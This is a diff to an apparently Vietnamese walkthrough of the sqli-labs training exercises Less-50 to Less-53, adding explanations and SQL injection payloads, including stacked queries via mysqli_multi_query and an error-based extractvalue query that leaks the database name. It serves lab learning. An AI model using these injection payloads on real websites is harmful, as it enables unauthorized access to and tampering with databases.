@@ -15,6 +15,9 @@ Link tải lab tại [đây](https://github.com/Audi-1/sqli-labs)
 - [Less-48](#Less-48)
 - [Less-49](#Less-49)
 - [Less-50](#Less-50)
+- [Less-51](#Less-51)
+- [Less-52](#Less-52)
+- [Less-53](#Less-53)
 
 ## Less-38
 
@@ -196,5 +199,22 @@ Trong câu này, đề bài có sử dụng `mysqli_multi_query()`, tức là n�
 
 Nên chỉ cần inject câu query vào sau dấu `;`
 
-Payload: `?sort=1; create table less50 like user;-- `
+Payload: `?sort=1; create table less50 like users;--+ `
 
+## Less-51
+
+Ở câu này, mình có thể inject nhiều câu query cùng lúc thông qua `mysqli_multi_query()`, và trong câu này còn trả về kết quả khi lỗi trong `mysqli_error()`.
+
+Payload tương tự câu 50 hoặc sử dụng `extractvalue()`.
+
+`?sort=1%27%20and%20extractvalue(0x0a,concat(0x0a,(select%20database())))--+`
+
+## Less-52
+
+Tương tự câu 50, vẫn là `Stacked Injection`, nhưng lỗi mysql sẽ không hiển thị.
+
+Payload: `?sort=1; create table less51 like users;--+ `
+
+## Less-53
+
+Tương tự câu 51, và lỗi mysql sẽ không hiển thị.
